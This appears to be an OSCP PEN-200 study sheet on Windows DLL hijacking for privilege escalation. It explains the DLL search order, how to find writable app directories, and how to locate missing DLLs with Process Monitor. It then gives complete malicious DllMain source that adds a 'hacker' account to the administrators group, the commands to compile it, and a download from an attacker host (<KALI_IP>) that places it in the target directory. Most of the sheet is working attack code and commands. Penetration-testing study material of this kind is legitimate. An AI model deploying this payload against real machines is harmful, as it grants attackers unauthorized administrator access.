# 🪟 OSCP PEN-200 — DLL Hijacking

> **Goal:** Plant a malicious DLL in a writable app directory → privileged user triggers it → escalate

---

## 📖 Concept

Windows apps load **DLLs** for shared functionality following a fixed **search order**.  
If a DLL is **missing** and the first search path is **writable** → plant your own DLL there.

```
App starts → searches DLL search order → hits writable dir first
→ loads YOUR DLL → DllMain executes → payload runs
```

---

## 🔍 DLL Search Order (Safe Mode ON — Windows default)

| # | Location |
|---|---|
| 1 | **App directory** ← most common hijack point |
| 2 | System directory (`C:\Windows\System32`) |
| 3 | 16-bit system directory |
| 4 | Windows directory (`C:\Windows`) |
| 5 | Current directory |
| 6 | `PATH` environment variable directories |

> ⚠️ Safe Mode OFF → current directory moves to position **2**

---

## ⚔️ Attack Types

| Type | How |
|---|---|
| Replace existing DLL | Overwrite a DLL the app already uses |
| **Missing DLL hijack** | App looks for a DLL that doesn't exist → plant yours at position 1 ✅ |

---

## 🗺️ Attack Flow

### Step 1 — Enumerate Installed Apps

```powershell
# 32-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

> Look for non-Microsoft / user-installed apps → research for known DLL hijacking CVEs.

---

### Step 2 — Check if App Directory is Writable

```powershell
echo "test" > 'C:\AppDir\test.txt'
type 'C:\AppDir\test.txt'

icacls "C:\path\to\binary folder"
```

✅ File created = you can write here = valid hijack location.

---

### Step 3 — Find Missing DLLs (Process Monitor)

> Needs admin rights — run on your own machine with the copied binary.

**Filters to set:**

| Column | Relation | Value | Action |
|---|---|---|---|
| Process Name | is | `filezilla.exe` | Include |
| Operation | is | `CreateFile` | Include |
| Path | contains | `TextShaping.dll` | Include |

**What to look for:**

| Procmon Result | Meaning |
|---|---|
| `NAME NOT FOUND` | ✅ DLL missing here — plant yours |
| `SUCCESS` | DLL found — not a hijack point |

---

### Step 4 — Create Malicious DLL (Kali)

**`malicious.cpp`**

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:   // ← payload goes here
            int i;
            i = system("net user hacker password123! /add");
            i = system("net localgroup administrators hacker /add");
            break;
        case DLL_THREAD_ATTACH:  break;
        case DLL_THREAD_DETACH:  break;
        case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}
```

**Compile & serve:**

```bash
x86_64-w64-mingw32-gcc malicious.cpp --shared -o TextShaping.dll
python3 -m http.server 80
```

---

### Step 5 — Transfer DLL to App Directory (Target)

```powershell
iwr -uri http://<KALI_IP>/TextShaping.dll -OutFile 'C:\AppDir\TextShaping.dll'
```

> OutFile path must be the **app directory** (position 1 in search order).

---

### Step 6 — Wait & Verify

```powershell
net user
net localgroup administrators
# Your user appears when a privileged user launches the app
```

---

## 🧠 Key Concepts

### DllMain Cases

| Case | Fires When |
|---|---|
| `DLL_PROCESS_ATTACH` | Process loads the DLL ← **put payload here** |
| `DLL_THREAD_ATTACH` | New thread is created |
| `DLL_THREAD_DETACH` | Thread exits |
| `DLL_PROCESS_DETACH` | Process unloads the DLL |

---

## ⚖️ Binary Hijack vs DLL Hijack

| | Binary Hijack | DLL Hijack |
|---|---|---|
| Target | The `.exe` itself | A `.dll` the exe loads |
| Write access needed | On the binary file | In the app directory |
| Trigger | Service restart / reboot | App launch by any user |
| Runs as | Service account (SYSTEM) | Whoever launches the app |
| App still works? | ❌ No | ⚠️ Sometimes |

---

## ⚡ Quick Reference

```bash
# Compile EXE (binary hijack)
x86_64-w64-mingw32-gcc adduser.c -o evil.exe

# Compile DLL (DLL hijack) — note --shared flag
x86_64-w64-mingw32-gcc malicious.cpp --shared -o MissingDLL.dll

# Serve files
python3 -m http.server 80
```

```powershell
# Enumerate apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Test write access
echo "test" > 'C:\AppDir\test.txt'

# Download DLL to app dir
iwr -uri http://<KALI_IP>/MissingDLL.dll -OutFile 'C:\AppDir\MissingDLL.dll'

# Verify escalation
net localgroup administrators
```

---
